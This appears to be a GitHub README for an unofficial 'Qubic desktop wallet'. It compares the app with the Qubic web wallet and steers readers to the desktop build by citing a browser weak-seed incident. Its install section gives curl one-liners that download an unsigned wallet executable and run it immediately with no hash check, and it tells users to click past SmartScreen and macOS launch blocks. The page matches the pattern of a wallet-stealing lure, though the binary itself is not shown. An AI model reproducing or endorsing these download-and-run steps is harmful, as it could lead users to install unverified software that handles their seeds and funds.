![Qubic desktop wallet vs web wallet](assets/banner-trust.png)

# Qubic Desktop Wallet vs the Qubic Web Wallet

Same network, same assets, different answer to one question: who holds the key.

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) - 57,942,724 B (55.3 MiB) |
| <img src="assets/platform-macos.svg" alt="platform macos"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) - 49,066,728 B (46.8 MiB) |
| <img src="assets/platform-linux.svg" alt="platform linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) - 51,287,539 B (48.9 MiB) |

Both form factors are described as they stand at the [current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2) and its client constants.

> The form factor decides where the key lives. Everything else is a detail.

The Qubic desktop wallet is an installed application that keeps your encrypted account on your own disk; the web wallet is a page that manages an account in the browser. They reach the same network and hold the same assets, so the choice is not about features - it is about where the seed is generated, where it is stored, and what you can verify before trusting either one.

<!-- ARTICLE-BODY-BEGIN -->

## Four dimensions that actually differ

| Dimension | Desktop app | Web wallet |
| --- | --- | --- |
| Key location | `qwallet/keys` in your home folder, encrypted | Whatever the page stores, which you cannot inspect |
| Verifiability | Published hash, checksum file inside the archive | Whatever the page serves at the moment you load it |
| Seed generation | Local, in the app | In the browser, which is where the October 2026 weakness lived |
| Offline use | Opens and unlocks without a network | Needs the page to load first |

The generation row is the one with history behind it. Browser-based seed generation on iPhone, iPad and Safari before 18 October 2026 produced weak seeds, and the desktop build was not among the affected clients.

## What the desktop build gives up

Nothing is free. A desktop app needs installing, it is unsigned, and it needs the hash check that the web wallet does not - which is the <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-download-verify-installer.md">verification step</a> people skip.

It also lives on one machine, so a stolen laptop is a stolen account file, mitigated only by the password and auto-lock.

## What the web wallet gives up

It cannot prove what it served you, and it cannot work offline. For a balance check that is fine; for holding a large amount it is a trust decision you cannot audit.

## The recommendation

Use the desktop build for anything you would be upset to lose, and the web wallet for reading a balance when you are away from your machine. If you want a phone client, no mobile build exists yet, which the <a href="https://github.com/qubic-wallet/qubic-wallet-features/blob/main/qubic-wallet-app-mobile-status.md">mobile status page</a> documents.

Install from the <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2">current Qubic Wallet release</a> rather than an older copy, so the behaviour you rely on matches what this comparison describes.

## FAQ

### Are they the same wallet?

They are two clients for the same network and the same account model, not two accounts.

### Can I use both with one seed?

Yes, by restoring the same seed in both, which is deliberate duplication rather than synchronisation.

### Is the web wallet unsafe?

It is unverifiable rather than malicious. You cannot check what code ran, and that is a real limit.

### Which one do most people need?

The desktop build, because it can be verified and backed up locally.

### Does the desktop app need the internet?

Not to open or unlock. It needs the network for balances and transfers.

<!-- ARTICLE-BODY-END -->

## How to install Qubic Wallet

<!-- INSTALL-BEGIN: D11. Windows ships one .exe; macOS and Linux ship .zip archives holding the executable and its checksum file. Two checksum levels: the download itself, then the .Wallet binary inside the archive. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Verify the download before running it (PowerShell): `Get-FileHash .\setup.exe -Algorithm SHA256`
3. Open the downloaded file.
4. If SmartScreen appears, choose More info, then Run anyway.
5. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet && ./qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a> for Apple silicon, or <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-x64.zip">qubic-wallet-desktop-v0.8.2-osx-x64.zip</a> for an Intel Mac.
2. Verify the download: `shasum -a 256 wallet.zip`
3. Extract the archive; it contains the executable, an icon and a checksum file.
4. Open Terminal in the extracted folder and run `chmod +x` on the `.Wallet` file.
5. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop.sha256` then `shasum -a 256 qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet`
6. Run that file; if macOS blocks the first launch, allow it under System Settings, Privacy and Security.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet && ./qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip">qubic-wallet-desktop-v0.8.2-linux-x64.zip</a>.
2. Verify the download: `sha256sum wallet.zip`
3. Extract the archive.
4. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop.sha256` then `sha256sum qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet`
5. Mark the `.Wallet` file executable.
6. Run it.

### Published SHA-256 values (upload of 2026-11-22)

| File | Download-level SHA-256 |
| --- | --- |
| `qubic-wallet-desktop-v0.8.2-windows.exe` | `eb8b377ecf884da5932d3721e428823ed2787c061cc3ae3d3afaedc8d8593815` |
| `qubic-wallet-desktop-v0.8.2-osx-arm64.zip` | `8f4414a987a328fd1a75012b4c6a84fc10bc269df58ceb08104fe8c008815c81` |
| `qubic-wallet-desktop-v0.8.2-osx-x64.zip` | `923915b18899a03f7ba5685ec653102c74293d83aa078ffa9961db4c62990cd4` |
| `qubic-wallet-desktop-v0.8.2-linux-x64.zip` | `682d4dc414804fe3359f8e91d370f689aef99f3e82cecc382fd87180269cc9fc` |

Compare the value your command prints with the row for the file you downloaded. The second check reads the `.sha256` file shipped inside the archive, which hashes the extracted `.Wallet` binary and names it `qubic-wallet-desktop`; compare the two hashes by eye rather than running the file as a checklist, because the stored name is not the extracted file name. A mismatch at either level means stop: delete the file and download again from this repository's release page.
<!-- INSTALL-END -->

## Related guides

- [Download and verify the installer](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-download-verify-installer.md)
- [Mobile app status](https://github.com/qubic-wallet/qubic-wallet-features/blob/main/qubic-wallet-app-mobile-status.md)
- [October 2026 weak-seed incident](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-october-2026-weak-seed-incident.md)
- [Current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2)
